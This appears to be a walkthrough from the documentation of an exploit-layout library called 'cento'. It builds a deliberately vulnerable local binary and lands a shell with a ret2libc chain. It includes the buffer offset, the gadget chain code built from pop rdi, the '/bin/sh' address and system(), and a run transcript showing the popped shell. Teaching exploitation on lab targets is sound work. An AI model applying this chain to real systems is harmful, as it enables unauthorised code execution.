# Walkthrough: smashme, end to end with cento

A real, running version of ex01's ret2libc pair. `../before.py` / `../after.py` freeze
their offsets so the example can assert byte-equality offline; here everything
ASLR-dependent is derived live from this host's libc, and the same cento
layout lands a shell.

## 1. Build it

```sh
make            # gcc -O0 -fno-stack-protector -no-pie -z noexecstack
```

The Makefile's `offset-check` target verifies the canonical layout
empirically: it disassembles `vuln()` and requires `lea -0x80(%rbp)` as the
buffer address, i.e. `buf` at `rbp-0x80` -- 128 bytes of buffer plus 8 of
saved rbp puts saved RIP at offset **136**. (gcc 11.4 at `-O0` lays a
`char buf[128]` out exactly this way; if a different compiler padded the
frame, the check fails loudly instead of the exploit failing silently.)

`vuln` prints where libc's `puts` really lives this run, then reads 0x200
bytes into the 128-byte buffer and returns:

```text
$ ./vuln
puts @ 0x7a30d4880e10
```

(The leak uses `dlsym(RTLD_DEFAULT, "puts")` because in a `-no-pie` binary a
bare `&puts` is the fixed PLT stub, not the ASLR'd libc address.)

## 2. The layout -- built before the target even starts

`solve.py` derives the offsets from the libc file itself (dynsym for
`puts`/`system`, byte search for `"/bin/sh"`, `5f c3` and `c3` inside
executable segments), then builds the exact `../after.py` shape:

```python
class Ret2Libc(cento.View, size=0x20):
    rip = cento.Field(0x00, cento.u64)  # saved RIP -> pop rdi ; ret
    arg = cento.Field(0x08, cento.u64)  # what pop rdi pops
    align = cento.Field(0x10, cento.u64)  # ret: system's movaps alignment
    call = cento.Field(0x18, cento.u64)  # system()


layout = cento.Layout(endian="little")
stack = layout.region("stack", max_size=0xA8, fill=0x41)  # the pad is the fill
libc = layout.sym("libc_base")  # the leak, as a symbol
frame = stack.at(0x88, Ret2Libc, name="frame")
frame.rip = libc + offs["pop_rdi"]
frame.arg = libc + offs["binsh"]
frame.align = libc + offs["ret"]
frame.call = libc + offs["system"]
```

No pad statement, no `b"A"*136`: the region fill is the pad, and "offset
136" is the single placement offset of a named frame.

## 3. What the fixup list showed before the leak arrived

Emitting before the bind is legal -- and informative. The four gadget
cells each report themselves blocked on the one fact nobody knows yet:

```text
Fixup(region='stack', offset=136, width=8, missing=('libc_base',))
Fixup(region='stack', offset=144, width=8, missing=('libc_base',))
Fixup(region='stack', offset=152, width=8, missing=('libc_base',))
Fixup(region='stack', offset=160, width=8, missing=('libc_base',))
```

This is the chain's dependency structure made explicit: exactly four cells,
all waiting on exactly one symbol. If a fifth cell ever appeared here, or a
second symbol, the plan changed and the list says so -- before any byte is
sent. Nothing emits stale, and nothing about the chain's *shape* depends on
the leak.

## 4. Run it

```sh
python3 solve.py
```

Expected transcript (addresses vary per run -- that is the point):

```text
[*] derived offsets: puts=0x80e10 system=0x50d70 binsh=0x1d8678 pop_rdi=0x2a3e5 ret=0x29cd6
[*] pre-leak fixups (the chain waits on exactly one symbol):
      Fixup(region='stack', offset=136, width=8, missing=('libc_base',))
      ...
[*] leak: puts @ 0x7a30d4880e10 -> libc_base = 0x7a30d4800000
[+] shell answered: CENTO_PWNED_18cb3426 (raw tail: b'CENTO_PWNED_18cb3426\n')
```

The leak line arrives, `layout.bind("libc_base", base)` resolves all four
fixups at once, the final `emit()` produces the 168-byte chain (padded to
0x200 so `vuln`'s single `read()` consumes the whole write), and the popped
`system("/bin/sh")` answers with the marker. Run it again: different base,
same layout, same one bind.
